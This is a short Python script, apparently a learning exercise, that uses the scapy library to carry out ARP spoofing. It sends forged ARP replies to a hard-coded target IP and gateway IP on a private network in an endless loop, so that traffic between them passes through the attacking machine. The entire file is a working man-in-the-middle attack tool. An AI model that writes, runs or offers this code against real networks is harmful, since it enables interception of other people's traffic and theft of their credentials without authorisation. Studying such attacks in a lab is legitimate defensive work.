import scapy.all as scapy 
import time

target_ip="192.168.132.30"

router_ip="192.168.132.2"

#Locate MAC address of target
def get_mac(ip):
    arp_request=scapy.ARP(pdst=ip)
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadscast=broadcast/arp_request
    ans_list=scapy.srp(arp_request_broadscast,timeout=1,verbose=False)[0]
    
    return ans_list[0][1].hwsrc

#Send "I have this  MAC address" to target 
def spoof(target_ip,destination_ip):
    #target_mac=get_mac(target_ip)
    packet = scapy.ARP(op=2,pdst=target_ip,hwdst="",psrc=destination_ip)
    scapy.send(packet,verbose=False)
    
#repeat updating  ARP table
packet_counter=0
while True:
    spoof(target_ip, router_ip)
    spoof(router_ip, target_ip)
    packet_counter+=2
    print("\r[+] Send  " +str(packet_counter)+ "  packets.",end="")
    time.sleep(2)

